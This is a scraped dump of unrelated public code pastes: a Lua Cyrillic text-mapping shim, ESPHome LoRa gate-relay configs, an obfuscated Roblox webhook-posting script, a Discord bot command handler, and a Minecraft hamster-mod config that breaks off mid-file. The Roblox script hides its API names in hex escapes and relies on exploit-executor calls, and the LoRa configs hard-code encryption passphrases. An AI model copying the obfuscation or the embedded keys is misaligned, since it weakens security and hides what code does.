    b = ""\232"",     q = ""\233"",     r = ""\234"",
    k = ""\235"",     v = ""\236"",     y = ""\237"",
    j = ""\238"",     g = ""\239"",     h = ""\240"",
    c = ""\241"",     n = ""\242"",     e = ""\243"",
    a = ""\244"",     [""[""] = ""\245"", w = ""\246"",
    x = ""\247"",     i = ""\248"",     o = ""\249"",
    [""]""] = ""\250"", s = ""\251"",     m = ""\252"",
    [""'""] = ""\253"", ["".""] = ""\254"", z = ""\255"",
} 

setmetatable(ru_map, {
  __index = function(_, idx)
    return idx
  end
})

function Ru(input)
    local result = """"
    local inRussian = false
    local i = 1

    while i <= #input do
        if input:sub(i, i + 1) == ""~~"" then
            inRussian = not inRussian
            i = i + 2
        else
            local ch = input:sub(i, i)
            if inRussian then
                result = result .. ru_map[ch]
            else
                result = result .. ch
            end
            i = i + 1
        end
    end

    return result
end

local old_print = print
local old_wrap = peripheral.wrap
local old_find = peripheral.find
local old_term_write = term.write

print = function(...)
    local args = table.pack(...)
    for i = 1, args.n do
        args[i] = Ru(tostring(args[i]))
    end
    old_print(table.unpack(args, 1, args.n))
end

term.write = function(text)
    old_term_write(Ru(tostring(text)))
end
 
local function wrapDeviceWrite(device)
    if device and type(device.write) == ""function"" then
        local old_write = device.write
        device.write = function(...)
            local args = {...}
            if type(args[1]) == ""string"" then
                args[1] = Ru(args[1])
            end
            return old_write(table.unpack(args))
        end
    end
    return device
end
 
peripheral.wrap = function(side)
    local dev = old_wrap(side)
    return wrapDeviceWrite(dev)
end
 
peripheral.find = function(typeFilter, ...)
    local dev = old_find(typeFilter, ...)
    return wrapDeviceWrite(dev)
end"
ZZrP3Ga3,Lora receiver,fabrizio97726,YAML,Saturday 26th of July 2025 08:53:21 AM CDT,"web_server:
  port: 80
  version: 3
  include_internal: true
  local: true  

spi:
  clk_pin: GPIO5
  mosi_pin: GPIO27
  miso_pin: GPIO19   

# CONFIGURAZIONE LORA COMPONENTE SX 1276
sx127x:
  dio0_pin: GPIO26
  cs_pin: GPIO18
  rst_pin: GPIO23 # verificare versione scheda
  pa_pin: BOOST
  pa_power: 17
  bandwidth: 125_0kHz
  crc_enable: true
  frequency: 433920000
  modulation: LORA
  rx_start: true
  sync_value: 0x12
  spreading_factor: 7
  coding_rate: CR_4_5
  on_packet:
    then:
      - lambda: |-
          ESP_LOGD(""lambda"", ""packet %s"", format_hex(x).c_str());
          ESP_LOGD(""lambda"", ""rssi %.2f"", rssi);
          ESP_LOGD(""lambda"", ""snr %.2f"", snr);    

sensor:

#WIFI
  - platform: wifi_signal
    name: ""WiFi Signal lora 1""
    update_interval: 15s
    filters:
      - sliding_window_moving_average:
          window_size: 15
          send_every: 15
          send_first_at: 15
    icon: mdi:wifi    


packet_transport:
  platform: sx127x
  update_interval: 1s
  encryption: ""fabriziodigital""
  rolling_code_enable: true

  binary_sensors:
    - rele_lora2

  providers:
    name: lora-1
    encryption: ""fabriziodigital1""

button:
  - platform: restart
    name: ""Restart"" 

  - platform: template 
    name: ""Apri cancello box lora 2""
    id: apri_cancello_box_lora_2
    icon: ""mdi:gate""
    on_press:                       
      then:
        - script.execute: pressioni_telecomando  
             

switch:
  - platform: gpio
    pin: GPIO12
    name: Relè
    id: rele
  
binary_sensor:
  - platform: packet_transport
    provider: lora-1
    id: rele_lora1
    on_press:
      switch.turn_on: rele
    on_release:
      then:
        - script.execute: pressioni_telecomando           

  - platform: template
    id: rele_lora2
    lambda: return id(rele).state;

script:
  - id: pressioni_telecomando
    then:
      - switch.turn_on: rele
      - delay: 2s
      - switch.turn_off: rele
      - delay: 1s
      - switch.turn_on: rele 
      - delay: 2s
      - switch.turn_off: rele 
      - delay: 1s
      - switch.turn_on: rele 
      - delay: 2s
      - switch.turn_off: rele 

  "
w47m5wAp,webhook sender test #,Dirsks,Lua,Saturday 26th of July 2025 08:53:16 AM CDT,"local v1 = game
local v2 = v1[""\x47\x65\x74\x53\x65\x72\x76\x69\x63\x65""]
local A = v2(v1, ""\x50\x6c\x61\x79\x65\x72\x73"")
local B = v2(v1, ""\x53\x74\x61\x72\x74\x65\x72\x47\x75\x69"")
local C = v2(v1, (""\72\116\116\112\83\101\114\118\105\99\101""):gsub(""."", function(c) return string.char(c:byte()) end))

local D = ""\x72\x62\x78\x61\x73\x73\x65\x74\x69\x64\x3a\x2f\x2f\x37\x34\x31\x36\x36\x38\x34\x37\x33\x37\x30\x34\x37\x32""

local Enc = function(str)
	return (str:gsub(""."", function(c)
		return ""\\""..c:byte()
	end))
end

local Func = loadstring([[
return function()
	local _ENV = _ENV
	local h = {
		[""Content-Type""] = ""application/json""
	}
	local data = {
		[""content""] = _G.web.Message
	}
	local json = ]] .. ""game:GetService('"" .. (""HttpService"") .. ""'):JSONEncode(data)"" .. [[

	request({
		Url = _G.web.Webhook,
		Method = ""POST"",
		Headers = h,
		Body = json
	})

	game:GetService(""StarterGui""):SetCore(""SendNotification"", {
		Title = ""request send"",
		Text = ""SendMessage()"",
		Icon = ""]] .. D .. [["",
		Duration = 6
	})
end
]])()

local Func2 = loadstring([[
return function()
	local embed = _G.web.embed
	local headers = {
		[""Content-Type""] = ""application/json""
	}
	local payload = {
		[""embeds""] = {
			{
				[""title""] = embed.title or """",
				[""description""] = embed.description or """",
				[""color""] = embed.color or 2123412,
				[""fields""] = embed.fields or {},
				[""footer""] = {
					[""text""] = embed.footer and embed.footer.text or """"
				}
			}
		}
	}
	local body = game:GetService(""HttpService""):JSONEncode(payload)

	request({
		Url = _G.web.Webhook,
		Method = ""POST"",
		Headers = headers,
		Body = body
	})

	game:GetService(""StarterGui""):SetCore(""SendNotification"", {
		Title = ""request send"",
		Text = ""SendEmbed()"",
		Icon = ""]] .. D .. [["",
		Duration = 6
	})
end
]])()

if not _G.web or not _G.web.Webhook or _G.web.Webhook == """" then
	B:SetCore(""\x53\x65\x6e\x64\x4e\x6f\x74\x69\x66\x69\x63\x61\x74\x69\x6f\x6e"", {
		Title = Enc(""Webhook not set or unavaible""),
		Text = Enc(""Webhook isn’t set.""),
		Icon = D,
		Duration = 5
	})
	return
end

if _G.web.Message and _G.web.Message ~= """" then
	Func()
end

if _G.web.embed and typeof(_G.web.embed) == ""table"" then
	Func2()
end"
LFHVMtqb,Lora sender,fabrizio97726,YAML,Saturday 26th of July 2025 08:49:50 AM CDT,"web_server:
  port: 80
  version: 3
  include_internal: true
  local: true

spi:
  clk_pin: GPIO5
  mosi_pin: GPIO27
  miso_pin: GPIO19   

# CONFIGURAZIONE LORA COMPONENTE SX 1276
sx127x:
  dio0_pin: GPIO26
  cs_pin: GPIO18
  rst_pin: GPIO23 # verificare versione scheda
  pa_pin: BOOST
  pa_power: 17
  bandwidth: 125_0kHz
  crc_enable: true
  frequency: 433920000
  modulation: LORA
  rx_start: true
  sync_value: 0x12
  spreading_factor: 7
  coding_rate: CR_4_5
  preamble_size: 6  
  on_packet:
    then:
      - lambda: |-
          ESP_LOGD(""lambda"", ""packet %s"", format_hex(x).c_str());
          ESP_LOGD(""lambda"", ""rssi %.2f"", rssi);
          ESP_LOGD(""lambda"", ""snr %.2f"", snr);    

packet_transport:
  platform: sx127x
  update_interval: 1s
  encryption: ""fabriziodigital1""
  binary_sensors:
    - rele_lora1
  providers:
    - name: lora-2
      encryption: ""fabriziodigital""
sensor:

#WIFI
  - platform: wifi_signal
    name: ""WiFi Signal lora 1""
    update_interval: 15s
    filters:
      - sliding_window_moving_average:
          window_size: 15
          send_every: 15
          send_first_at: 15
    icon: mdi:wifi  
    
button:
  - platform: template
    name: ""Transmit Packet""
    on_press:
      then:
        - sx127x.send_packet:
            data: [0xC5, 0x51, 0x78, 0x82, 0xB7, 0xF9, 0x9C, 0x5C]
  
  - platform: template 
    name: ""Apri cancello box""
    id: apri_cancello_box
    icon: ""mdi:gate""
    on_press:                       
      then:
        - script.execute: pressioni_telecomando  
             

  - platform: restart
    name: ""Restart""  
                
switch:
  - platform: template
    name: Relè
    id: rele
    optimistic: True
    

binary_sensor:
  - platform: template
    id: rele_lora1
    lambda: return id(rele).state;

  - platform: packet_transport
    id: rele_lora2
    provider: lora-2
    on_press:
      switch.turn_on: rele

    on_release:
      then:
         - script.execute: pressioni_telecomando   


script:
  - id: pressioni_telecomando
    then:
      - switch.turn_on: rele
      - delay: 2s
      - switch.turn_off: rele
      - delay: 1s
      - switch.turn_on: rele 
      - delay: 2s
      - switch.turn_off: rele 
      - delay: 1s
      - switch.turn_on: rele 
      - delay: 2s
      - switch.turn_off: rele "
UxGKzs99,Untitled,forevergaming,JavaScript,Saturday 26th of July 2025 08:43:11 AM CDT,"client.on('interactionCreate', async (interaction) => {
    try {
        if (interaction.isCommand()) {
            if (!interaction.guild || !interaction.channel) return;

            const botPermissions = interaction.channel.permissionsFor(interaction.guild.members.me);
            if (!botPermissions?.has(PermissionFlagsBits.SendMessages)) return;
        
            const db = global.mongoClient.db('discordBot');
            const settings = await db.collection('botSettings').findOne({ _id: 'botSettings' });
            const bannedCollection = db.collection('commandBans');
            const isMaintenance = settings?.maintenance;

            if (isMaintenance && interaction.user.id !== ownerId) {
                return interaction.reply({
                    content: '🛠️ The bot is currently under maintenance. Please try again later.',
                    ephemeral: true,
                });
            }

            const command = client.commands.get(interaction.commandName);

            if (command) {
                let subcommand = '';

                if (interaction.options?.getSubcommand) {
                    try {
                        subcommand = interaction.options.getSubcommand();
                    } catch (error) {
                        subcommand = '';
                    }
                }
                const isBanned = await bannedCollection.findOne({
                    commandName: interaction.commandName,
                    serverId: interaction.guild.id
                });

                if (isBanned) {
                const bannedEmbed = new EmbedBuilder()
                    .setColor('Red')
                    .setTitle('🚫 Command Banned')
                    .setDescription(`The command \`/${interaction.commandName}\` is banned in this server.`)
                    .setFooter({ text: 'If you think this is unfair, report it in the support server: discord.gg/JmXdVQDwt2' });

                return interaction.reply({ embeds: [bannedEmbed], ephemeral: true });
                }

                await command.execute(interaction, client);

                const logChannelId = '1334497445173788702';
                const logChannel = client.channels.cache.get(logChannelId);

                if (logChannel) {
                    const commandNameToLog = subcommand
                        ? `${interaction.commandName} ${subcommand}`
                        : `${interaction.commandName}`;

                    const embed = new EmbedBuilder()
                        .setColor('Blue')
                        .setTitle('Command Executed')
                        .addFields(
                            { name: 'Command', value: `\`/${commandNameToLog}\`` },
                            { name: 'User', value: `${interaction.user.tag} <@${interaction.user.id}>`, inline: true },
                            { name: 'Server', value: `${interaction.guild?.name || 'DMs'} (${interaction.guildId || 'N/A'})`, inline: true },
                            { name: 'Channel', value: `${interaction.channel?.name || 'DMs'} <#${interaction.channelId}>`, inline: true }
                        )
                        .setTimestamp();

                    await logChannel.send({ embeds: [embed] });
                }
            } else{
              try {
                    const fallbackHandler = require(`./commands/slash/${interaction.commandName}.js`);
                    if (fallbackHandler && fallbackHandler.execute) {
                        await fallbackHandler.execute(interaction, client);
                    }
                } catch (err) {
                    console.error(`No handler found for /${interaction.commandName}`);
                }
            }
        } else if(interaction.isButton()){
            const db = global.mongoClient.db('discordBot');
            const settings = await db.collection('botSettings').findOne({ _id: 'botSettings' });
            const isMaintenance = settings?.maintenance;

            if (isMaintenance && interaction.user.id !== ownerId) {
                return interaction.reply({
                    content: '🛠️ The bot is currently under maintenance. Please try again later.',
                    ephemeral: true,
                });
            }            
        }
    } catch (error) {
        console.error('Error in interactionCreate event:', error);
        const errorChannel = interaction.client.channels.cache.get(ERROR_CHANNEL_ID);

        if (errorChannel) {
            errorChannel.send(`⚠️ **Error in \`interactionCreate\`:**\n\`\`\`js\n${error.stack}\`\`\``);
        }

        if (interaction.replied || interaction.deferred) {
            await interaction.followUp({ content: 'An error occurred while processing your interaction.', ephemeral: true });
        } else {
            await interaction.reply({ content: 'An error occurred while processing your interaction.', ephemeral: true });
        }
    }
});"
Ja5Fjcr0,AHP Config Files,dawsonbodenhamer,Java,Saturday 26th of July 2025 08:34:59 AM CDT,"```java
package net.dawson.adorablehamsterpets.config;

import me.fzzyhmstrs.fzzy_config.api.ConfigApiJava;
import me.fzzyhmstrs.fzzy_config.api.RegisterType;

/**
 * Static holder for the single Adorable Hamster Pets config.
 * Touching {@code Configs.AHP} guarantees the config is registered,
 * loaded from file, and its sync/GUI channels are ready.
 */
public final class Configs {

    /** Global, sync-enabled, GUI-enabled config instance. */
    public static final AhpConfig AHP =
            ConfigApiJava.registerAndLoadConfig(AhpConfig::new, RegisterType.BOTH);

    private Configs() {} // prevent instantiation
}
```


```java
package net.dawson.adorablehamsterpets.config;

import me.fzzyhmstrs.fzzy_config.annotations.ClientModifiable;
import me.fzzyhmstrs.fzzy_config.annotations.RootConfig;
import me.fzzyhmstrs.fzzy_config.config.Config;
import me.fzzyhmstrs.fzzy_config.config.ConfigAction;
import me.fzzyhmstrs.fzzy_config.config.ConfigGroup;
import me.fzzyhmstrs.fzzy_config.screen.widget.TextureIds;
import me.fzzyhmstrs.fzzy_config.util.Translatable;
import me.fzzyhmstrs.fzzy_config.validation.number.ValidatedDouble;
import me.fzzyhmstrs.fzzy_config.validation.number.ValidatedFloat;
import me.fzzyhmstrs.fzzy_config.validation.number.ValidatedInt;
import net.dawson.adorablehamsterpets.AdorableHamsterPets;
import net.minecraft.text.ClickEvent;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;

import java.util.ArrayList;
import java.util.List;

/**
 * Root-level, single-file config for Adorable Hamster Pets.
 */
@Translatable.Name(""Adorable Hamster Pets"")
@Translatable.Desc(""Questionable Configuration Options"")
@RootConfig
public class AhpConfig extends Config {

    public AhpConfig() {
        super(Identifier.of(AdorableHamsterPets.MOD_ID, ""main""));
    }

    // --- Help & Other Distractions ---
    @Translatable.Name(""Help & Other Distractions"")
    @Translatable.Desc(""Buttons for when you’re lost, bored, or met a bug that’s not just existential hamster angst."")
    public ConfigGroup helpAndResources = new ConfigGroup(""helpAndResources"", false);

    @ClientModifiable
    @Translatable.Name(""I Lost My Book!"")
    @Translatable.Desc(""Misplaced your invaluable tome of rodent wisdom? Click here. I won't tell anyone."")
    public ConfigAction giveGuideBook = new ConfigAction.Builder()
            .title(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.giveGuideBook""))
            .desc(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.giveGuideBook.desc""))
            .decoration(TextureIds.INSTANCE.getDECO_BOOK())
            .build(new ClickEvent(ClickEvent.Action.RUN_COMMAND,
                    ""/function adorablehamsterpets:technical/give_guide_book""));

    @ClientModifiable
    @Translatable.Name(""Report a Bug"")
    @Translatable.Desc(""Found a game-breaking issue? Or a hamster phasing through the floor? Let me know on Github. The more details, the better. And believe it or not, I do check this frequently."")
    public ConfigAction reportBug = new ConfigAction.Builder()
            .title(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.reportBug""))
            .desc(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.reportBug.desc""))
            .decoration(TextureIds.INSTANCE.getDECO_LINK())
            .build(new ClickEvent(ClickEvent.Action.OPEN_URL,
                    ""https://github.com/DawsonBodenhamer/Adorable-Hamster-Pets-1.21/issues""));

    @ClientModifiable
    @Translatable.Name(""Join Discord"")
    @Translatable.Desc(""Join 'The Hamster Pouch' official Discord server. A place to share screenshots, get support, or just witness the ongoing development chaos. You're invited."")
    public ConfigAction joinDiscord = new ConfigAction.Builder()
            .title(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.joinDiscord""))
            .desc(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.joinDiscord.desc""))
            .decoration(TextureIds.INSTANCE.getDECO_BUTTON_CLICK())
            .build(new ClickEvent(ClickEvent.Action.OPEN_URL,
                    ""https://discord.gg/w54mk5bqdf""));

    @ClientModifiable
    @ConfigGroup.Pop
    @Translatable.Name(""Visit My Website"")
    @Translatable.Desc(""Shameless plug for my other, less-rodent-focused work. Click if you dare."")
    public ConfigAction visitWebsite = new ConfigAction.Builder()
            .title(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.visitWebsite""))
            .desc(Text.translatable(""config.adorablehamsterpets.main.helpAndResources.visitWebsite.desc""))
            .decoration(TextureIds.INSTANCE.getDECO_LINK())
            .build(new ClickEvent(ClickEvent.Action.OPEN_URL,
                    ""https://www.fortheking.design""));

    // --- UI & Quality of Life ---
    @Translatable.Name(""UI & Quality of Life"")
    @Translatable.Desc(""Because Sanity is Overrated"")
    public ConfigGroup uiPreferences = new ConfigGroup(""uiPreferences"", true);

    @ClientModifiable
    @Translatable.Name(""Enable Auto Guidebook Delivery"")
    @Translatable.Desc(""Hand-delivers the sacred texts on first login. Read it—or don’t. I'm not your conscience."")
    public boolean enableAutoGuidebookDelivery = true;

    @ClientModifiable
    @Translatable.Name(""Enable Mod Item Tooltips"")
    @Translatable.Desc(""Helpful whispers on what the heck that cucumber is for."")
    public boolean enableItemTooltips = true;

    @ClientModifiable
    @Translatable.Name(""Enable Shoulder Dismount Messages"")
    @Translatable.Desc(""Little status mumbles when your co-pilot disembarks."")
    public boolean enableShoulderDismountMessages = true;

    @ClientModifiable
    @ConfigGroup.Pop
    @Translatable.Name(""Enable Jade Hamster Debug Info"")
    @Translatable.Desc(""More stats than anyone asked for. Defaults to off—mercifully."")
    public boolean enableJadeHamsterDebugInfo = false;

    // --- Core Feature Toggles ---
    @Translatable.Name(""Core Feature Toggles"")
    @Translatable.Desc(""Fundamental hamster hijinks— fiddle at your own risk."")
    public ConfigGroup core = new ConfigGroup(""core"", true);

    @Translatable.Name(""Enable Hamster Throwing"")
    @Translatable.Desc(""Do we yeet the hamster? ('G' by default)."")
    public boolean enableHamsterThrowing = true;

    @Translatable.Name(""Require Food Mix to Unlock Cheeks"")
    @Translatable.Desc(""Gate cheek-pouch storage behind gourmet cuisine, because drama."")
    public boolean requireFoodMixToUnlockCheeks = true;

    @ClientModifiable
    @ConfigGroup.Pop
    @Translatable.Name(""Use 'Hampter' as Default Name"")
    @Translatable.Desc(""Changes the default entity name from 'Hamster' to 'Hampter'. Note: This has no visible effect in vanilla Minecraft, as mobs don't show nameplates by default. It's primarily for use with mods like Auto Leveling that display entity names."")
    public boolean useHampterName = false;

    // --- Core Cooldown Settings ---
    @Translatable.Name(""Core Cooldown Settings"")
    @Translatable.Desc(""Mandatory hamster union breaks between heroic stunts."")
    public ConfigGroup cooldowns = new ConfigGroup(""cooldowns"", true);

    @Translatable.Name(""Cleaning Frequency"")
    @Translatable.Desc(""How often a sitting hamster gets the sudden urge to clean. It's a 1-in-X chance per tick, so lower numbers mean a higher chance for cleaning. For example, 1200 means on average, it'll clean about once a minute. 300 ≈ every 15 secs, and 5000 ≈ every 4 mins. Congratulations— now you know enough to be dangerous."")
    public ValidatedInt cleaningChanceDenominator = new ValidatedInt(1200, 5000, 300);

    @Translatable.Name(""Throw Cooldown (Ticks)"")
    @Translatable.Desc(""Time-out after using your living projectile. (20 ticks = 1 s)"")
    public ValidatedInt hamsterThrowCooldown = new ValidatedInt(2400, 20 * 60 * 10, 20);

    @Translatable.Name(""Green Bean Buff Cooldown (Ticks)"")
    @Translatable.Desc(""When the sugar rush ends, force a breather. (20 ticks = 1 s)"")
    public ValidatedInt steamedGreenBeansBuffCooldown = new ValidatedInt(6000, 20 * 60 * 10, 20);

    @Translatable.Name(""Enable Diamond Seeking Cooldown?"")
    @Translatable.Desc(""Force a cool-down after striking it rich. Off by default, since this can't happen again anyway without another mount/dismount on the shoulder."")
    public boolean enableIndependentDiamondSeekCooldown = false;

    @Translatable.Name(""Diamond Seeking Cooldown (Ticks)"")
    @Translatable.Desc(""Cooldown before your hamster can go on another treasure hunt. (20 ticks = 1 s)"")
    public ValidatedInt independentOreSeekCooldownTicks = new ValidatedInt(2400, 6000, 20);

    @Translatable.Name(""Diamond Thievery Cooldown (Ticks)"")
    @Translatable.Desc(""Mandatory time-out after a successful heist to prevent serial kleptomania. (20 ticks = 1s). WARNING: Increasing this cooldown can dramatically change the diamond stealing mechanic, since that AI goal sometimes re-runs multiple times in a row when the hamster has trouble pathfinding to the item that it wants to steal. So instead of increasing this, you should probably just stop dropping your diamonds on the ground everywhere, butter fingers."")
    public ValidatedInt stealCooldownTicks = new ValidatedInt(100, 6000, 20);

    @ConfigGroup.Pop
    @Translatable.Name(""Breeding Cooldown (Ticks)"")
    @Translatable.Desc(""Hamsters need their space. (20 ticks = 1 s)"")
    public ValidatedInt breedingCooldownTicks = new ValidatedInt(6000, 24000, 600);

    // --- Spawn Settings ---
    @Translatable.Name(""Spawn Settings"")
    @Translatable.Desc(""How Many, Where, and How Often?  Note: Some of these settings require re-logging into your world to take effect."")
    public ConfigGroup hamsterSpawning = new ConfigGroup(""hamsterSpawning"", true);

    @Translatable.Name(""Spawn Weight"")
    @Translatable.Desc(""Adjusts hamster spawn frequency. Higher = more chaos. 1 = blissful silence."")
    public ValidatedInt spawnWeight = new ValidatedInt(30, 100, 1);

    @Translatable.Name(""Max Group Size"")
    @Translatable.Desc(""Maximum hamsters per spawn group. Because sometimes one just isn't cute enough."")
    public ValidatedInt maxGroupSize = new ValidatedInt(1, 10, 1);

    @Translatable.Name(""Vanilla Biome Tags"")
    @Translatable.Desc(""A list of biome tags where hamsters can spawn. Format: 'mod_id:tag_name'. For example, 'minecraft:is_forest'."")
    public List<String> spawnBiomeTags = new ArrayList<>(List.of(
            ""minecraft:is_beach"",
            ""minecraft:is_badlands"",
            ""minecraft:is_savanna"",
            ""minecraft:is_jungle"",
            ""minecraft:is_forest"",
            ""minecraft:is_taiga"",
            ""minecraft:is_mountain""
    ));

    @Translatable.Name(""Convention Biome Tags"")
    @Translatable.Desc(""A list of 'c:' convention biome tags where hamsters can spawn. Used for broad mod compatibility. By default, this includes most common overworld types."")
    public List<String> spawnBiomeConventionTags = new ArrayList<>(List.of(
            ""c:is_cold"",
            ""c:is_hot"",
            ""c:is_temperate"",
            ""c:is_dry"",
            ""c:is_wet"",
            ""c:is_dense_vegetation"",
            ""c:is_sparse_vegetation""
    ));

    @Translatable.Name(""Include Specific Biomes"")
    @Translatable.Desc(""A list of specific biome IDs to ALWAYS allow spawns in, even if they don't match the tags above. Format: 'mod_id:biome_name'. For example, 'minecraft:plains'."")
    public List<String> includeBiomes = new ArrayList<>(List.of(
            // Specific Biomes from old isKeyInSpawnList
            ""minecraft:snowy_plains"", ""minecraft:snowy_taiga"", ""minecraft:snowy_slopes"",
            ""minecraft:frozen_peaks"", ""minecraft:jagged_peaks"", ""minecraft:grove"",
            ""minecraft:frozen_river"", ""minecraft:snowy_beach"", ""minecraft:frozen_ocean"",
            ""minecraft:deep_frozen_ocean"", ""minecraft:ice_spikes"", ""minecraft:cherry_grove"",
            ""minecraft:lush_caves"", ""minecraft:dripstone_caves"", ""minecraft:deep_dark"",
            ""minecraft:swamp"", ""minecraft:mangrove_swamp"", ""minecraft:desert"",
            ""minecraft:plains"", ""minecraft:sunflower_plains"", ""minecraft:meadow"",
            ""minecraft:old_growth_birch_forest"", ""minecraft:windswept_hills"",
            ""minecraft:windswept_gravelly_hills"", ""minecraft:windswept_forest"",
            ""minecraft:windswept_savanna"", ""minecraft:stony_peaks"", ""minecraft:sparse_jungle"",
            ""minecraft:bamboo_jungle"", ""minecraft:stony_shore"", ""minecraft:mushroom_fields"",
            ""minecraft:deep_dark"", ""minecraft:forest"", ""minecraft:birch_forest"", ""minecraft:dark_forest"",
            ""minecraft:taiga"", ""minecraft:old_growth_pine_taiga"", ""minecraft:old_growth_spruce_taiga"",
            ""minecraft:savanna"", ""minecraft:savanna_plateau"", ""minecraft:badlands"",
            ""minecraft:eroded_badlands"", ""minecraft:wooded_badlands"", ""minecraft:beach"",

            ""terralith:desert_canyon"", ""terralith:cave/andesite_caves"", ""terralith:cave/crystal_caves"", ""terralith:cave/deep_caves"", ""terralith:cave/desert_caves"", ""terralith:cave/diorite_caves"", ""terralith:cave/frostfire_caves"", ""terralith:cave/fungal_caves"", ""terralith:cave/granite_caves"", ""terralith:cave/ice_caves"", ""terralith:cave/infested_caves"", ""terralith:cave/mantle_caves"", ""terralith:cave/thermal_caves"", ""terralith:cave/tuff_caves"", ""terralith:cave/underground_jungle"",
            ""terralith:alpha_islands_winter"", ""terralith:alpha_islands"", ""terralith:alpine_grove"", ""terralith:alpine_highlands"", ""terralith:amethyst_canyon"", ""terralith:amethyst_rainforest"", ""terralith:ancient_sands"", ""terralith:arid_highlands"", ""terralith:ashen_savanna"",
            ""terralith:basalt_cliffs"", ""terralith:birch_taiga"", ""terralith:blooming_plateau"", ""terralith:blooming_valley"", ""terralith:brushland"", ""terralith:bryce_canyon"", ""terralith:caldera"", ""terralith:cloud_forest"", ""terralith:cold_shrubland"",
            ""terralith:desert_oasis"", ""terralith:desert_spires"", ""terralith:emerald_peaks"", ""terralith:forested_highlands"", ""terralith:fractured_savanna"", ""terralith:frozen_cliffs"", ""terralith:glacial_chasm"", ""terralith:granite_cliffs"",
            ""terralith:gravel_beach"", ""terralith:gravel_desert"", ""terralith:haze_mountain"", ""terralith:highlands"", ""terralith:hot_shrubland"", ""terralith:ice_marsh"", ""terralith:jungle_mountains"",
            ""terralith:lavender_forest"", ""terralith:lavender_valley"", ""terralith:lush_desert"", ""terralith:lush_valley"", ""terralith:mirage_isles"", ""terralith:moonlight_grove"", ""terralith:moonlight_valley"", ""terralith:mountain_steppe"",
            ""terralith:orchid_swamp"", ""terralith:painted_mountains"", ""terralith:red_oasis"", ""terralith:rocky_jungle"", ""terralith:rocky_mountains"", ""terralith:rocky_shrubland"",
            ""terralith:sakura_grove"", ""terralith:sakura_valley"", ""terralith:sandstone_valley"", ""terralith:savanna_badlands"", ""terralith:savanna_slopes"", ""terralith:scarlet_mountains"",
            ""terralith:shield_clearing"", ""terralith:shield"", ""terralith:shrubland"", ""terralith:siberian_grove"", ""terralith:siberian_taiga"",
            ""terralith:skylands_autumn"", ""terralith:skylands_spring"", ""terralith:skylands_summer"", ""terralith:skylands_winter"", ""terralith:skylands"",
            ""terralith:snowy_badlands"", ""terralith:snowy_cherry_grove"", ""terralith:snowy_maple_forest"", ""terralith:snowy_shield"",
            ""terralith:steppe"", ""terralith:stony_spires"", ""terralith:temperate_highlands"", ""terralith:tropical_jungle"", ""terralith:valley_clearing"",
            ""terralith:volcanic_crater"", ""terralith:volcanic_peaks"", ""terralith:warm_river"", ""terralith:warped_mesa"", ""terralith:white_cliffs"", ""terralith:white_mesa"",
            ""terralith:windswept_spires"", ""terralith:wintry_forest"", ""terralith:wintry_lowlands"", ""terralith:yellowstone"", ""terralith:yosemite_cliffs"", ""terralith:yosemite_lowlands"",

            ""biomesoplenty:wasteland"", ""biomesoplenty:wasteland_steppe"",
            ""biomesoplenty:mediterranean_forest"", ""biomesoplenty:mystic_grove"", ""biomesoplenty:orchard"", ""biomesoplenty:pumpkin_patch"",
            ""biomesoplenty:redwood_forest"", ""biomesoplenty:seasonal_forest"", ""biomesoplenty:woodland"",
            ""biomesoplenty:floodplain"", ""biomesoplenty:fungal_jungle"", ""biomesoplenty:rainforest"", ""biomesoplenty:rocky_rainforest"",

            ""byg:lush_stacks"", ""byg:orchard"", ""byg:frosted_coniferous_forest"", ""byg:allium_fields"", ""byg:amaranth_fields"", ""byg:rose_fields"",
            ""byg:temperate_grove"", ""byg:coconino_meadow"", ""byg:skyris_vale"", ""byg:prairie"", ""byg:autumnal_valley"", ""byg:cardinal_tundra"", ""byg:firecracker_shrubland"",
            ""byg:allium_shrubland"", ""byg:amaranth_grassland"", ""byg:araucaria_savanna"", ""byg:aspen_boreal"", ""byg:atacama_outback"", ""byg:baobab_savanna"",
            ""byg:basalt_barrera"", ""byg:bayou"", ""byg:black_forest"", ""byg:canadian_shield"", ""byg:cika_woods"", ""byg:coniferous_forest"",
            ""byg:crimson_tundra"", ""byg:cypress_swamplands"", ""byg:dacite_ridges"", ""byg:dacite_shore"", ""byg:dead_sea"", ""byg:ebony_woods"",
            ""byg:enchanted_tangle"", ""byg:eroded_borealis"", ""byg:firecracker_chaparral"", ""byg:forgotten_forest"", ""byg:fragment_jungle"",
            ""byg:frosted_taiga"", ""byg:howling_peaks"", ""byg:ironwood_gour"", ""byg:jacaranda_jungle"", ""byg:maple_taiga"", ""byg:mojave_desert"",
            ""byg:overgrowth_woodlands"", ""byg:pumpkin_valley"", ""byg:rainbow_beach"", ""byg:red_rock_valley"", ""byg:redwood_thicket"",
            ""byg:rugged_badlands"", ""byg:sakura_grove"", ""byg:shattered_glacier"", ""byg:sierra_badlands"", ""byg:skyrise_vale"",
            ""byg:tropical_rainforest"", ""byg:weeping_witch_forest"", ""byg:white_mangrove_marshes"", ""byg:windswept_desert"", ""byg:zelkova_forest""
    ));

    @ConfigGroup.Pop
    @Translatable.Name(""Exclude Specific Biomes"")
    @Translatable.Desc(""A list of specific biome IDs to NEVER allow spawns in, even if they match a tag. This overrides all other settings. Format: 'mod_id:biome_name'. For example, 'minecraft:plains'."")
    public List<String> excludeBiomes = new ArrayList<>(List.of(""mod_id:biome_name""));

    // --- Taming & Breeding Settings ---
    @Translatable.Name(""Taming & Breeding Settings"")
    @Translatable.Desc(""Convince a hamster to love you—and occasionally accept a roommate."")
    public ConfigGroup tamingAndBreeding = new ConfigGroup(""tamingAndBreeding"", true);

    @ConfigGroup.Pop
    @Translatable.Name(""Taming Chance"")
    @Translatable.Desc(""Taming difficulty (1 in X chance). Higher = more cucumbers sacrificed to fuzzy freeloaders."")
    public ValidatedInt tamingChanceDenominator = new ValidatedInt(3, 20, 1);

    // --- Shoulder Feature Settings ---
    @Translatable.Name(""Shoulder Feature Settings"")
    @Translatable.Desc(""Change how the fuzzy parrot of doom whispers danger—and diamonds—into your ear."")
    public ConfigGroup shoulder = new ConfigGroup(""shoulder"", true);

    @Translatable.Name(""Enable Creeper Detection"")
    @Translatable.Desc(""May save your inventory. Or your ears."")
